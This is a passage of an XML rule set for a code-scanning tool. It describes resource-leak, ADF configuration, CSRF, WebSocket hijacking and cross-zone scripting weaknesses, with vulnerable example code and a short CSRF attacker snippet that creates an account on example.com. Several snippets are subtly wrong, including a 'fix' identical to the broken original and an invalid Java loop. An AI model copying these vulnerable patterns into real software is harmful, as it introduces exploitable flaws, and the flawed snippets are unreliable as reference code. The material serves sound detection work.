																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 404, CWE ID 619</em> <br></p>
																									   <p>[8]  <em>Data Storage, Android Developers</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Risky Resource Management - CWE ID 404</em> <br></p>
																									   <p>[12] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_unreleased_resource_database</key>
		<internalKey>Code Quality/Unreleased Resource/Database</internalKey>
		<name>Unreleased Resource: Database</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program can potentially fail to release an XQuery resource.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The program can potentially fail to release an XQuery resource.<br>  <br>  Resource leaks have at least two common causes:<br><br>  - Error conditions and other exceptional circumstances.<br><br>  - Confusion over which part of the program is responsible for releasing the resource.<br><br>  Most unreleased resource issues result in general software reliability problems, but if an attacker can intentionally trigger a resource leak, the attacker may be able to launch a denial of service attack by depleting the resource pool.<br><br>  <b>Example:</b> Under normal conditions, the following code executes an XQuery query, processes the results returned by the database, and closes the allocated statement object. But if an exception occurs while executing the query or processing the results, the connection object will not be closed. If this happens often enough, the database will run out of available connections.<br>  <pre><br>   XQDataSource xqs = new XQDataSource();<br>   XQConnection conn = xqs.getConnection();<br>   XQPreparedExpression xqpe = conn.prepareExpression(query);<br>   XQResultSequence rs = xqpe.executeQuery();<br>   processResults(rs);<br>   rs.close();<br>   xqpe.close();<br>   rs.close();<br>  </pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 404</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[10] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Risky Resource Management - CWE ID 404</em> <br></p>
																									   <p>[11] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_unreleased_resource_files</key>
		<internalKey>Code Quality/Unreleased Resource/Files</internalKey>
		<name>Unreleased Resource: Files</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program can potentially fail to release a file handle.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The program can potentially fail to release a file handle.<br><br>Resource leaks have at least two common causes:<br><br>- Error conditions and other exceptional circumstances.<br><br>- Confusion over which part of the program is responsible for releasing the resource.<br><br>Most unreleased resource issues result in general software reliability problems, but if an attacker can intentionally trigger a resource leak, the attacker may be able to launch a denial of service attack by depleting the resource pool.<br><br><b>Example 1:</b> The following method never closes the file handle it opens. The <code>finalize()</code> method for <code>ZipFile</code> eventually calls <code>close()</code>, but there is no guarantee as to how long it will take before the <code>finalize()</code> method will be invoked. In a busy environment, this can result in the JVM using up all of its file handles.<br><br><pre><br>public void printZipContents(String fName)<br>    throws ZipException, IOException, SecurityException, IllegalStateException, NoSuchElementException<br>{<br>  ZipFile zf = new ZipFile(fName);<br>  Enumeration&lt;ZipEntry&gt; e = zf.entries();<br><br>  while (e.hasMoreElements()) {<br>    printFileInfo(e.nextElement());<br>  }<br>}<br></pre><br><br><b>Example 2:</b> Under normal conditions, the following fix properly closes the file handle after printing out all the zip file entries. But if an exception occurs while iterating through the entries, the zip file handle will not be closed. If this happens often enough, the JVM can still run out of available file handles.<br><br><pre><br>public void printZipContents(String fName)<br>    throws ZipException, IOException, SecurityException, IllegalStateException, NoSuchElementException<br>{<br>  ZipFile zf = new ZipFile(fName);<br>  Enumeration&lt;ZipEntry&gt; e = zf.entries();<br><br>  while (e.hasMoreElements()) {<br>    printFileInfo(e.nextElement());<br>  }<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 404</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[10] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Risky Resource Management - CWE ID 404</em> <br></p>
																									   <p>[11] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_unreleased_resource_sockets</key>
		<internalKey>Code Quality/Unreleased Resource/Sockets</internalKey>
		<name>Unreleased Resource: Sockets</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program can potentially fail to release a socket.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The program can potentially fail to release a socket.<br><br><br>Resource leaks have at least two common causes:<br><br>- Error conditions and other exceptional circumstances.<br><br>- Confusion over which part of the program is responsible for releasing the resource.<br><br>Most unreleased resource issues result in general software reliability problems, but if an attacker can intentionally trigger a resource leak, the attacker may be able to launch a denial of service attack by depleting the resource pool.<br><br><b>Example 1:</b> The following method never closes the socket it opens. In a busy environment, this can result in the JVM using up all of its sockets.<br><br><pre><br>private void echoSocket(String host, int port) throws UnknownHostException, SocketException, IOException<br>{<br>  Socket sock = new Socket(host, port);<br>  BufferedReader reader = new BufferedReader(new InputStreamReader(sock.getInputStream()));<br><br>  while ((String socketData = reader.readLine()) != null) {<br>    System.out.println(socketData);<br>  }<br>}<br></pre><br><br><b>Example 2:</b> Under normal conditions, the following fix properly closes the socket and any associated streams. But if an exception occurs while reading the input or writing the data to screen, the socket object will not be closed. If this happens often enough, the system will run out of sockets and not be able to handle any further connections.<br><br><pre><br>private void echoSocket(String host, int port) throws UnknownHostException, SocketException, IOException<br>{<br>  Socket sock = new Socket(host, port);<br>  BufferedReader reader = new BufferedReader(new InputStreamReader(sock.getInputStream()));<br><br>  while ((String socketData = reader.readLine()) != null) {<br>    System.out.println(socketData);<br>  }<br>  sock.close();<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 404</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[10] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Risky Resource Management - CWE ID 404</em> <br></p>
																									   <p>[11] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_unreleased_resource_streams</key>
		<internalKey>Code Quality/Unreleased Resource/Streams</internalKey>
		<name>Unreleased Resource: Streams</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program can potentially fail to release a system resource.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The program can potentially fail to release a system resource.<br><br>Resource leaks have at least two common causes:<br><br>- Error conditions and other exceptional circumstances.<br><br>- Confusion over which part of the program is responsible for releasing the resource.<br><br>Most unreleased resource issues result in general software reliability problems, but if an attacker can intentionally trigger a resource leak, the attacker may be able to launch a denial of service attack by depleting the resource pool.<br><br><b>Example:</b> The following method never closes the file handle it opens. The <code>finalize()</code> method for <code>FileInputStream</code> eventually calls <code>close()</code>, but there is no guarantee as to how long it will take before the <code>finalize()</code> method will be invoked. In a busy environment, this can result in the JVM using up all of its file handles.<br><pre><br>private void processFile(String fName) throws FileNotFoundException, IOException {<br>  FileInputStream fis = new FileInputStream(fName);<br>  int sz;<br>  byte[] byteArray = new byte[BLOCK_SIZE];<br>  while ((sz = fis.read(byteArray)) != -1) {<br>    processBytes(byteArray, sz);<br>  }<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 404</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[10] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Risky Resource Management - CWE ID 404</em> <br></p>
																									   <p>[11] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_unreleased_resource_synchronization</key>
		<internalKey>Code Quality/Unreleased Resource/Synchronization
		</internalKey>
		<name>Unreleased Resource: Synchronization</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program fails to release a lock it holds, which might lead to deadlock.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The program can potentially fail to release a system resource.<br><br>Resource leaks have at least two common causes:<br><br>- Error conditions and other exceptional circumstances.<br><br>- Confusion over which part of the program is responsible for releasing the resource.<br><br>Most unreleased resource issues result in general software reliability problems, but if an attacker can intentionally trigger a resource leak, the attacker may be able to launch a denial of service by depleting the resource pool.<br><br><b>Example 1:</b> The following code establishes a lock before <code>performOperationInCriticalSection()</code>, but fails to release the lock if an exception is thrown in that method.<br><br><pre><br>ReentrantLock  myLock = new ReentrantLock ();<br><br>myLock.lock();<br>performOperationInCriticalSection();<br>myLock.unlock();<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 411</em> <br></p>
																									   <p>[8] Sun Microsystems, Inc. <em>Java Sun Tutorial - JavaDoc - Class ReentrantLock</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[11] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>encapsulation_adf_bad_practices_default_url_invoke_disallowed_setting
		</key>
		<internalKey>Encapsulation/ADF Bad Practices/Default
			url-invoke-disallowed Setting
		</internalKey>
		<name>ADF Bad Practices: Default url-invoke-disallowed Setting</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Relying on an implicit default <code>url-invoke-disallowed</code> setting lacks clarity and can lead to unwanted behavior if the default changes unexpectedly.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  By default, task flows in a Fusion application are not directly accessible from a GET request: whenever a URL attempts to invoke the task flow, it receives an <code>HTTP 403</code> status code. However, relying on an implicit setting always lacks clarity and can potentially lead to unwanted behavior if the default setting changes underneath.<br><br><b>Example 1:</b> The following snippet from a task flow definition file shows an example of a task flow configured with the implicit default <code>url-invoke-disallowed</code> setting.<br><br><pre><br>...<br>    &lt;task-flow-definition id="password"&gt;<br>        &lt;default-activity&gt;PasswordPrompt&lt;/default-activity&gt;<br>        &lt;view id="PasswordPrompt"&gt;<br>            &lt;page&gt;/PasswordPrompt.jsff&lt;/page&gt;<br>        &lt;/view&gt;<br>        &lt;use-page-fragments/&gt;<br>    &lt;/task-flow-definition&gt;<br>...<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[4] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[6]  <em>Oracle(R) Fusion Middleware Fusion Developer's Guide for Oracle Application Development Framework, 15.6.4.How to Call a Bounded Task Flow Using a URL</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>encapsulation</tag>
	</rule>
	<rule>
		<key>encapsulation_cross_site_request_forgery</key>
		<internalKey>Encapsulation/Cross-Site Request Forgery</internalKey>
		<name>Cross-Site Request Forgery</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  HTTP requests must contain a user-specific secret in order to prevent an attacker from making unauthorized requests.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A cross-site request forgery (CSRF) vulnerability occurs when:<br>1. A Web application uses session cookies.<br><br>2. The application acts on an HTTP request without verifying that the request was made with the user's consent.<br><br><br><br>A nonce is a cryptographic random value that is sent with a message to prevent replay attacks. If the request does not contain a nonce that proves its provenance, the code that handles the request is vulnerable to a CSRF attack (unless it does not change the state of the application.)  This means a Web application that uses session cookies has to take special precautions in order to ensure that an attacker can't trick users into submitting bogus requests. Imagine a Web application that allows administrators to create new accounts as follows:<br><br><pre><br>  RequestBuilder rb = new RequestBuilder(RequestBuilder.POST, "/new_user");<br>  body = addToPost(body, new_username);<br>  body = addToPost(body, new_passwd);<br>  rb.sendRequest(body, new NewAccountCallback(callback));<br></pre><br><br>An attacker might set up a malicious Web site that contains the following code.<br><br><pre><br>  RequestBuilder rb = new RequestBuilder(RequestBuilder.POST, "http://www.example.com/new_user");<br>  body = addToPost(body, "attacker";<br>  body = addToPost(body, "haha");<br>  rb.sendRequest(body, new NewAccountCallback(callback));<br></pre><br><br>If an administrator for the vulnerable site visits a page containing this code while she has an active session, she will unwittingly create an account for the attacker. This is a CSRF attack. It is possible because the application does not have a way to determine the provenance of the request. Any request could be a legitimate action chosen by the user or a faked action set up by an attacker. The attacker does not get to see the Web page that the bogus request generates, so the attack technique is only useful for requests that alter the state of the application.<br><br>Most Web browsers send an HTTP header named <code>referer</code> along with each request. The <code>referer</code> header is supposed to contain the URL of the referring page, but attackers can forge it, so the referer header is not useful for determining the provenance of a request.<br><br>Applications that pass the session identifier on the URL rather than as a cookie do not have CSRF problems because there is no way for the attacker to access the session identifier and include it as part of the bogus request.<br><br>CSRF is entry number five on the 2007 OWASP Top 10 list.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A5 Cross Site Request Forgery (CSRF)</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A5 Cross-Site Request Forgery (CSRF)</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A8 Cross-Site Request Forgery (CSRF)</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3585 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3585 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3585 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3585 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3585 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Cross-Site Request Forgery</em> <br></p>
																									   <p>[10] OWASP <em>Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 352</em> <br></p>
																									   <p>[12] A. Klein <em>Divide and Conquer: HTTP Response Splitting, Web Cache Poisoning Attacks, and Related Topics</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 352</em> <br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 352</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 352</em> <br></p>
																									   <p>[16] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[17] OWASP <em>OWASP Top 10</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-23 Session Authenticity (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>encapsulation</tag>
	</rule>
	<rule>
		<key>encapsulation_cross_site_websocket_hijacking</key>
		<internalKey>Encapsulation/Cross-Site WebSocket Hijacking
		</internalKey>
		<name>Cross-Site WebSocket Hijacking</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  <Paragraph>Server fails to verify request origin effectively accepting cross-domain requests which can be used by an attacker to hijack a bidirectional WebSocket connection.</Paragraph>
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Cross-Site WebSocket Hijacking occurs when a user is tricked into visiting a malicious site that will establish a WebSocket connection with a legitimate backend server. The initial HTTP request used to ask the server for upgrading to WebSocket protocol is a regular HTTP request and so, the browser will send any cookies bound to the target domain including any session cookies. If the server fails to verify the <code>Origin</code> header, it will allow any malicious site to impersonate the user and establish a bidirectional WebSocket connection without the user even noticing.<br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A5 Cross Site Request Forgery (CSRF)</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A5 Cross-Site Request Forgery (CSRF)</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A8 Cross-Site Request Forgery (CSRF)</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3585 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3585 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3585 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3585 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3585 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Cross-Site Request Forgery</em> <br></p>
																									   <p>[10] Christian Schneider <em>Cross-Site WebSocket Hijacking</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 352</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 352</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 352</em> <br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 352</em> <br></p>
																									   <p>[15] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[19] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-23 Session Authenticity (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>encapsulation</tag>
	</rule>
	<rule>
		<key>encapsulation_file_based_cross_zone_scripting</key>
		<internalKey>Encapsulation/File Based Cross-Zone Scripting
		</internalKey>
		<name>File Based Cross-Zone Scripting</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Loading a file that can run unstrusted scripts within the context of your application is dangerous.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  File Based Cross Zone Scripting occurs when the following conditions are met:<br><br>1. A file is loaded that could allow scripts to be run within your application<br><br>2. The script loaded is taken to be of same origin as the running application.<br><br>When both these conditions are met a series of attacks can be enabled, especially if other parties determine trust based on whether the information is coming from within the boundaries of your application.<br><br><b>Example 1:</b> The following code uses an Android WebView in order to load a file locally:<br><pre><br>...<br>myWebView.loadUrl("file:///android_asset/www/index.html");<br>...<br></pre><br>In the above example, the Android WebView renderer treats everything loaded with <code>loadUrl()</code> with a URL starting with &quot;file://&quot; as being in the same origin.<br><br>There are a few typical ways for an attacker to leverage a File Based Cross-Zone Scripting vulnerability when loading from a file:<br>- the local file could be manipulated by an attacker, who could inject script into the file.<br>This will be dependent on file permissions, where the file is located, or race conditions where a file may be saved and then loaded (there could be a time window for modification).<br><br>- the file may call out to an external resource.<br>This may occur when the file loaded retrieves scripts from an external resource.<br><br><b>Example 2:</b> The following code looks at an external source to determine the JavaScript that it should run.<br><pre><br>  &lt;script src="http://www.example.com/js/fancyWidget.js"/&gt;<br></pre><br>In the above example, an insecure protocol is being used which could permit the resulting script to be modified by a malicious actor. Alternatively, other attacks could be performed to re-route the machine to an attacker's site.<br><br>- the file loaded may contain cross-site scripting vulnerabilities.<br>If the file being loaded is able to have code injected, the injected code may be able to then run in the context of your application. This may not necessarily be the ability to inject JavaScript, but simply being able to inject HTML may also enable defacements or Denial of Service attacks.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A1 Cross Site Scripting (XSS)</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A2 Cross-Site Scripting (XSS)</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A3 Cross-Site Scripting (XSS)</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A4 Cross Site Scripting</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
